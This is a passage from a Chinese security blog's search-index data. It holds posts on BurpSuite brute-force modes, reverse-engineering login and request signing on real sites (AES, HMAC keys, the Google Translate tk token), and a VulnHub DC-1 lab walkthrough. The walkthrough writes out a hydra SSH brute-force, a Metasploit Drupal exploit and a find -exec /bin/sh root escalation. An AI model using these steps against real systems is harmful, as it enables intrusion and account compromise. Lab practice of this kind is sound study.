bomb（集束炸弹） 集束炸弹也允许使用多组payload组合，跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，那么它攻击会形成以下组合： 攻击序列 位置A 位置B 1 1 3 2 1 4 1 2 3 2 2 4 适用场景：账号、密码暴力破解","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"BurpSuite","slug":"BurpSuite","permalink":"http://yoursite.com/tags/BurpSuite/"}]},{"title":"JS逆向系列一","slug":"JS逆向一","date":"2020-06-17T10:16:58.000Z","updated":"2020-06-17T10:16:58.000Z","comments":true,"path":"2020/06/17/JS逆向一/","link":"","permalink":"http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/","excerpt":"","text":"谷歌学术镜像 目标网址：https://ac.scmor.com/ 目的是爬取学术镜像的真实地址，在Elements视图下，观察现在访问a标签，发现启用了onclick事件，调用了visit()函数，函数内的内容，猜测就是加密后的真实URL地址。 全局搜索visit,在 https://ac.scmor.com/res/?f=run&amp;v=1590682984 中，找到了visit函数 经过观察，猜测strdecode是解密函数，就在上几行的位置，有个可疑参数autour[b]，猜测是URL地址，在Console中测试一下 经测试，autour是个数组，里面存放了加密后的真实地址，strdecode也的确是解密函数，现在去拉取strdecode函数具体内容 全局搜索，找到了strdecode，经过初步观察，是Base64加密，然后缺啥补啥，将加密函数完整的提取出来 到此，加密函数也有了，现在需要收集全部的URL，于是，之前的autour数组，也拉下来，现在只需要遍历一下就好了，刚好有个run函数就是For循环遍历autour数组，也拿下来 稍微修改下细节，就大功告成，效果图如下： DNS.COM 目标网址：https://www.dns.com/login.html 随便输入帐号密码进行测试，发现有个XHR请求，里面的password，email两个请求参数都做了加密，猜测这就是刚才输入的帐号密码 全局搜索 password,通过在后面加上 : 或者 = 可以缩小范围，排除多余项，找到了password:的位置，现在其实已经很明显是AES加密了，但还是测试一下吧 打断点，重新登陆，果然进入debugger状态了。 然后在console中测试下aes()函数以及它的参数到底是什么，经验证，发现aes()正是一个加密函数，加密后的内容和一开始看到的相吻合 现在查看aes函数具体的内容，发现了又有k和iv，并且有个CryptoJS对象 全局搜索CryptoJS，发现了crypto-js.js文件，明显这是CryptoJS加密库 并且发现还用了$(selector).action()的jQuery语法，所以还需要载入jQuery库 从网上下载单独的CryptoJS库文件引入，从 网页中获取jQuery链接，并载入 jQuery，然后将aes函数也拉下来 效果图如下： 贝贝网 目标网址：https://m.beibei.com/login/login.html （需手机端） 输入帐号密码及验证码进行测试，发现一个XHR请求，类型为POST，提交的表单数据中的用户名密码都为明文，但问题在于请求参数中的_abr_一直在变化，猜测它为加密参数 全局搜索_abr_无果，只能打请求断点，成功断住 但是发现断点的位置没有我们要的内容，于是在call Stack中往下找调用栈，call Stack内的方法调用栈的规则是从上到下由最新调用处依次往下排列。在e.ajax中发现了包含有_abr_的内容，但是这里是要发送出去了，没有它的产生过程，于是继续往下找，终于找到了_abr_= 记录_abr_的值为：“013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1” 发现_abr_其实是由m(e.type, e.uri.pathname, e.query, e.form)函数生成，于是为了了解它的生成过程，在函数前打上断点，重新发送登陆请求 单步跟踪，发现了关键函数MD5 继续单步跟踪，又发现了一个关键函数HMAC 网上查找资料了解这个加密算法，发现HMAC算法，需要一个信息摘要算法以及一个密钥，在下方又找到关键函数HmacSHA1，于是推测使用了SHA-1算法 经过长时间的单步跟踪，总算来到了一开始的函数返回值部分 现在，我们开始分析，HMAC算法可以使用Python第三方库实现，先尝试一下。加密内容有了，密钥也有了（加密目标值可以用JSON.stringify()提取） 加密目标值：“01\\nPOST\\nb7da15fd7cdc2b8c73958ee82e7424aa\\n/mroute.html?method=beibei.user.token.get\\n1591002077” 密钥：“ytU7vwqIx2UXQNsi” Python测试效果如下 但是发现，与_abr的值相较，少了一些内容，回过头观察，发现_abr的值由a+m+h组成，a经测试是固定值01，m就是经过HMAC加密后的值，h会变动且暂时还不清楚 对h进行分析，发现是由s的值使用toString(16)函数变化而来，而s则是时间戳(new Date)变化而来 提取出h的算法，测试了一下，成功 接下来，只剩下需要加密的值，它如何产生的，观察发现由a + &quot;\\n&quot; + e + &quot;\\n&quot; + f + &quot;\\n&quot; + p + &quot;\\n&quot; + s组成，a、s都清楚了，e发现是POST，p是路径/mroute.html?method=beibei.h5.login，这两个也是固定值，只剩下f是MD5加密后的值，逆向f的产生过程，发现是由&quot;用户名+路径+登陆id&quot;产生而来，如：username=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010 所以现在只需要将这个值MD5加密后传入即可，同样也能用Python实现 最终完成的效果","categories":[{"name":"JS逆向","slug":"JS逆向","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"JS逆向系列","slug":"JS逆向系列","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]},{"title":"JS逆向系列之谷歌翻译","slug":"JS逆向之谷歌翻译","date":"2020-06-17T10:16:58.000Z","updated":"2020-06-17T10:16:58.000Z","comments":true,"path":"2020/06/17/JS逆向之谷歌翻译/","link":"","permalink":"http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/","excerpt":"","text":"一、逆向谷歌翻译 分析过程 首次分析 首先找到谷歌翻译的Ajax请求接口 以get方式发送的Ajax请求，多次尝试，发现请求参数中，tk和q，是不断变化的，其中q是待翻译的内容，tk是根据q进行js加密算法生成的，所以我们要分析tk的产生。 通过断点逆向tk的加密算法 加密算法应该在translate_m_zh-CN.js文件里 打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数 依次往下点击每一个调用的函数，当到了QE函数的时候，发现了tk参数来自b，b又明显来自c 于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案 分析生成tk的JS代码 如下是我们刚获取的JS代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var mu = function(a) &#123; return function() &#123; return a &#125;&#125; , nu = function(a, b) &#123; for (var c = 0; c &lt; b.length - 2; c += 3) &#123; var d = b.charAt(c + 2); d = &quot;a&quot; &lt;= d ? d.charCodeAt(0) - 87 : Number(d); d = &quot;+&quot; == b.charAt(c + 1) ? a &gt;&gt;&gt; d : a &lt;&lt; d; a = &quot;+&quot; == b.charAt(c) ? a + d &amp; 4294967295 : a ^ d &#125; return a&#125; , ou = null , pu = function(a) &#123; if (null !== ou) var b = ou; else &#123; b = mu(String.fromCharCode(84)); var c = mu(String.fromCharCode(75)); b = [b(), b()]; b[1] = c(); b = (ou = window[b.join(c())] || &quot;&quot;) || &quot;&quot; &#125; var d = mu(String.fromCharCode(116)); c = mu(String.fromCharCode(107)); d = [d(), d()]; d[1] = c(); c = &quot;&amp;&quot; + d.join(&quot;&quot;) + &quot;=&quot;; d = b.split(&quot;.&quot;); b = Number(d[0]) || 0; for (var e = [], f = 0, g = 0; g &lt; a.length; g++) &#123; var h = a.charCodeAt(g); 128 &gt; h ? e[f++] = h : (2048 &gt; h ? e[f++] = h &gt;&gt; 6 | 192 : (55296 == (h &amp; 64512) &amp;&amp; g + 1 &lt; a.length &amp;&amp; 56320 == (a.charCodeAt(g + 1) &amp; 64512) ? (h = 65536 + ((h &amp; 1023) &lt;&lt; 10) + (a.charCodeAt(++g) &amp; 1023), e[f++] = h &gt;&gt; 18 | 240, e[f++] = h &gt;&gt; 12 &amp; 63 | 128) : e[f++] = h &gt;&gt; 12 | 224, e[f++] = h &gt;&gt; 6 &amp; 63 | 128), e[f++] = h &amp; 63 | 128) &#125; a = b; for (f = 0; f &lt; e.length; f++) a += e[f], a = nu(a, &quot;+-a^+6&quot;); a = nu(a, &quot;+-3^+b+-f&quot;); a ^= Number(d[1]) || 0; 0 &gt; a &amp;&amp; (a = (a &amp; 2147483647) + 2147483648); a %= 1E6; return c + (a.toString() + &quot;.&quot; + (a ^ b))&#125;; 发现做了很多不必要的操作、甚至多此一举，目的是用于混淆 如： 12345var mu &#x3D; function(a) &#123; return function() &#123; return a &#125;&#125; 还用了.fromCharCode()函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现tk生成需要另一样东西，就是tkk这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的 具体实现 说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可 Python脚本 123456789101112131415161718192021222324252627import requestsimport jsonimport execjsdef get_tk(q): with open(&#x27;google_tk.js&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: js = f.read() j = execjs.compile(js) tk = j.call(&#x27;pu&#x27;, q) return tkdef translate_google(): q = input(&quot;请输入你要翻译的内容：&quot;) headers = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;, &quot;referer&quot;: &quot;https://translate.google.cn/&quot; &#125; url = &quot;https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=&quot; + get_tk( q) + &quot;&amp;q=&quot; + q res = requests.get(url, headers=headers) data = res.content.decode() json_data = json.loads(data) print(json_data[0][0][0])if __name__ == &quot;__main__&quot;: translate_google() tk.js 1234567891011121314151617181920212223242526272829303132//tkk = &#x27;441865.2154418832&#x27;;var nu = function (a, b) &#123; for (var c = 0; c &lt; b.length - 2; c += 3) &#123; var d = b.charAt(c + 2); d = &quot;a&quot; &lt;= d ? d.charCodeAt(0) - 87 : Number(d); d = &quot;+&quot; == b.charAt(c + 1) ? a &gt;&gt;&gt; d : a &lt;&lt; d; a = &quot;+&quot; == b.charAt(c) ? a + d &amp; 4294967295 : a ^ d &#125; return a&#125;,pu = function (a) &#123; tkk=&#x27;441865.2154418832&#x27;; var d = tkk.split(&quot;.&quot;); var b = Number(d[0]); for (var e = [], f = 0, g = 0; g &lt; a.length; g++) &#123; var h = a.charCodeAt(g); 128 &gt; h ? e[f++] = h : (2048 &gt; h ? e[f++] = h &gt;&gt; 6 | 192 : (55296 == (h &amp; 64512) &amp;&amp; g + 1 &lt; a.length &amp;&amp; 56320 == (a.charCodeAt(g + 1) &amp; 64512) ? (h = 65536 + ((h &amp; 1023) &lt;&lt; 10) + (a.charCodeAt(++g) &amp; 1023), e[f++] = h &gt;&gt; 18 | 240, e[f++] = h &gt;&gt; 12 &amp; 63 | 128) : e[f++] = h &gt;&gt; 12 | 224, e[f++] = h &gt;&gt; 6 &amp; 63 | 128), e[f++] = h &amp; 63 | 128) &#125; a = b; for (f = 0; f &lt; e.length; f++) a += e[f], a = nu(a, &quot;+-a^+6&quot;); a = nu(a, &quot;+-3^+b+-f&quot;); a ^= Number(d[1]) || 0; 0 &gt; a &amp;&amp; (a = (a &amp; 2147483647) + 2147483648); a %= 1E6; return (a.toString() + &quot;.&quot; + (a ^ b))&#125;; 运行效果 二、总结常见算法的加密原理 散列(hash)函数算法：MD5、SHA 对称加密算法：DES、3DES、AES 非对称性加密算法：RSA、DSA、ECC 散列(hash)函数算法 简介 Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。 1echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d 特点 一、不可逆，与原视数据没有对应关系 二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值 三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况 对称加密算法 简介 秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密) 非对称性加密算法 简介 秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高","categories":[{"name":"JS逆向","slug":"JS逆向","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"JS逆向系列","slug":"JS逆向系列","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]},{"title":"VulnHub渗透之DC-1","slug":"VulnHub渗透之DC-1","date":"2020-05-25T04:57:51.000Z","updated":"2020-05-25T04:57:51.000Z","comments":true,"path":"2020/05/25/VulnHub渗透之DC-1/","link":"","permalink":"http://yoursite.com/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/","excerpt":"","text":"0×00 说明 kali与目标处于同一网段下 攻击机：Kali(VMware ) IP:192.168.1.31 特别说明：每个靶机作者都对靶机做了详细的描述以及攻击目标，比如DC1就需要找到5个flag，最终目标是在root的主目录中找到并读取该标志！ 通过每个flag所获得知识点 1、msf的熟练使用以及搜索可利用漏洞（Drupal）； 2、留意目标网站的配置文件（慢慢查看别错过重要信息）； 3、数据库管理员提权（更新管理员密码或者添加一个新用户）； 4、suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）。 0×01 信息收集 探测目标IP namp -sP 192.168.1.0/24 arp-scan -l //扫描当前网段下的IP Cadmus Computer Systems 表示Virtualbox虚拟机 分析得出目标IP为192.168.1.30 靶机：DC-1(Virtualbox) IP:192.168.1.30 扫描端口 nmap -sV -p- 192.168.1.30 //扫描全端口 -sV 用来扫描目标主机和端口上运行的软件的版本 -p- 扫描0-65535全部端口 80端口开放，访问一下 Wappalyzer进行网站指纹识别，查看到是Drupal 7 查看一下robots.txt文件已经目录扫描(省略)。。发现没有可利用的地方 0×02metasploit 直接上metasploit 12root@sf:~# msfconsolemsf &gt; search Drupal 选择4，drupalgeddon2的exp，设置下rhost，直接exploit，成功 接下来使用msf自带的shell 发现flag1 查看当前路径下的文件，发现flag1.txt文件，查看一下，发现提示CMS配置文件有猫腻 发现flag2 网上搜索得知，Drupal 7的默认配置文件为sites/default/settings.php，查看发现flag2，还有数据库连接信息 0×003 弯路 尝试连接数据库，结果连接失败，应该是权限不足 爆破flag4用户密码 于是去查看/etc/passwd文件，发现flag4用户 使用hydra尝试爆破flag4用户的密码，hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30 成功爆破flag4的密码，为 orange ，接下来ssh登录flag4用户，查看当前路径下有flag4.txt，得到新的提示——root目录里有个flag 0×04 连接数据库 然后我们连接数据库，这次成功 顺藤摸瓜，仔细查找数据库 查看user表，发现admin用户 查看role表 查看role_permission表 查看node表 发现flag3 发现flag3，得知uid为1的用户是不受Drupal权限管制的，具有最高权限，uid 1用户也就是admin， 0×05 两个思路 一、重置管理员密码 使用Drupal对数据库的加密方法，加密脚本位置在网站根目录下的script下(msf shell)，使用脚本生成加密密文，然后登陆数据库修改admin的密码 修改密码为123456 成功登陆 二、添加一个管理员权限的用户 先查看一下靶机的版本，7.24 msf搜索Druapl 7.24对应可利用的脚本，发现一个符合 运行脚本，进行利用 增加了一个用户user，密码为123456，尝试登陆网站，发现登陆成功 发现flag3 从网站上找到了flag3的界面，得到提示Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.，重点在（FIND the passwd、need to -exec that command、in the shadow） 根据线索，我们又找到了flag4以及它的目录，再根据flag4的提示，（用相同的方法在root目录下）找到最终flag 0×06 提权 于是，想到suid提权，查询具有root权限的命令，以下均可查询： find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb { } 注： -type f即文件，-perm -u=s 即user权限位为suid 发现find命令本身就是root权限 于是就用find提权，find ./ aaa -exec '/bin/sh' \\\\; ，或者新建一个文件，验证一下，已经是root了 最终flag 接着找到根目录下的root目录，里面就是最终的flag 0×07 总结 DC-1找到最终的flag并不难，难在找齐五个flag，第一次实验，很生疏，存在很多问题： metasploit 熟练度不足，且exploit模块成功后的shell不是交互性，DC-1安装了python环境，可以通过pty.spawn()获得交互性shell exploitdb熟练度也不足 Linux熟练度不足，find命令，有待学习 suid提权的命令（nmap、vim、find、bash、more、less、nano、cp），有待学习","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"}]}],"categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"},{"name":"JS逆向","slug":"JS逆向","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"python库","slug":"python库","permalink":"http://yoursite.com/tags/python%E5%BA%93/"},{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"},{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"http://yoursite.com/tags/BurpSuite/"},{"name":"JS逆向系列","slug":"JS逆向系列","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]}